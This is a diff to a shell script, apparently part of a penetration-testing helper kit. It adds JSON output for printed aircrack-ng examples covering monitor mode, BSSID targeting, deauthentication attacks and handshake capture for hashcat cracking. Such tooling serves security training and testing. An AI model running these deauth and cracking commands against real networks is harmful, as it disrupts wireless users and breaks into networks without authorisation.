@@ -30,6 +30,8 @@ require_cmd aircrack-ng "brew install aircrack-ng"
 
 INTERFACE="${1:-wlan0}"
 
+json_set_meta "aircrack-ng" "$INTERFACE" "exploitation"
+
 confirm_execute
 safety_banner
 
@@ -63,51 +65,73 @@ echo ""
 info "1) Check wireless interface capabilities"
 echo "   sudo airmon-ng"
 echo ""
+json_add_example "1) Check wireless interface capabilities" \
+    "sudo airmon-ng"
 
 # 2. Start monitor mode
 info "2) Start monitor mode"
 echo "   sudo airmon-ng start ${INTERFACE}"
 echo ""
+json_add_example "2) Start monitor mode" \
+    "sudo airmon-ng start ${INTERFACE}"
 
 # 3. Scan for networks
 info "3) Scan for networks (all channels)"
 echo "   sudo airodump-ng ${INTERFACE}mon"
 echo ""
+json_add_example "3) Scan for networks (all channels)" \
+    "sudo airodump-ng ${INTERFACE}mon"
 
 # 4. Target a specific network by BSSID and channel
 info "4) Target a specific network by BSSID and channel"
 echo "   sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture ${INTERFACE}mon"
 echo ""
+json_add_example "4) Target a specific network by BSSID and channel" \
+    "sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture ${INTERFACE}mon"
 
 # 5. Send deauth to force reconnection
 info "5) Send deauth to force client reconnection (5 frames)"
 echo "   sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF ${INTERFACE}mon"
 echo ""
+json_add_example "5) Send deauth to force client reconnection (5 frames)" \
+    "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF ${INTERFACE}mon"
 
 # 6. Targeted deauth to specific client
 info "6) Targeted deauth to a specific client"
 echo "   sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 ${INTERFACE}mon"
 echo ""
+json_add_example "6) Targeted deauth to a specific client" \
+    "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 ${INTERFACE}mon"
 
 # 7. Verify handshake was captured
 info "7) Verify handshake was captured"
 echo "   aircrack-ng capture-01.cap"
 echo ""
+json_add_example "7) Verify handshake was captured" \
+    "aircrack-ng capture-01.cap"
 
 # 8. Convert capture for hashcat
 info "8) Convert capture for hashcat (GPU cracking)"
 echo "   aircrack-ng capture-01.cap -J capture_hccapx"
 echo ""
+json_add_example "8) Convert capture for hashcat (GPU cracking)" \
+    "aircrack-ng capture-01.cap -J capture_hccapx"
 
 # 9. Stop monitor mode when done
 info "9) Stop monitor mode when done"
 echo "   sudo airmon-ng stop ${INTERFACE}mon"
 echo ""
+json_add_example "9) Stop monitor mode when done" \
+    "sudo airmon-ng stop ${INTERFACE}mon"
 
 # 10. Complete workflow in sequence
 info "10) Complete workflow in sequence"
 echo "    sudo airmon-ng start ${INTERFACE} && sudo airodump-ng --bssid BSSID -c CH -w handshake ${INTERFACE}mon"
 echo ""
+json_add_example "10) Complete workflow in sequence" \
+    "sudo airmon-ng start ${INTERFACE} && sudo airodump-ng --bssid BSSID -c CH -w handshake ${INTERFACE}mon"
+
+json_finalize
 
 # Interactive demo (skip if non-interactive)
 if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
